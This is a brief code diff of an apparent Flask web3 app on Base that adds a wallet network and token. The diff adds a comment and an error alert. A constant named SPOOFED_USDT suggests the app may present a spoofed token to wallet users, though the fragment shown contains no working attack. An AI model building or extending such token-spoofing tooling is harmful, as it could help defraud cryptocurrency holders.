@@ -6,7 +6,7 @@ from web3 import Web3
 app = Flask(__name__)
 
 SPOOFED_USDT = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"  # Real Base USDT
-REAL_STBL = "0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c"
+REAL_STBL = "0x6ba2344F60C999D0ea102C59Ab8BE6872796C08c"  # Correct STBL
 BASE_RPC = "https://mainnet.base.org"
 w3 = Web3(Web3.HTTPProvider(BASE_RPC))
 
@@ -115,6 +115,7 @@ def add_network_and_token():
                         window.location.href = '/';
                     } catch (error) {
                         console.error('Network addition failed:', error);
+                        alert('Failed to add network: ' + error.message);
                     }
                 } else {
                     alert('Please install a compatible wallet!');
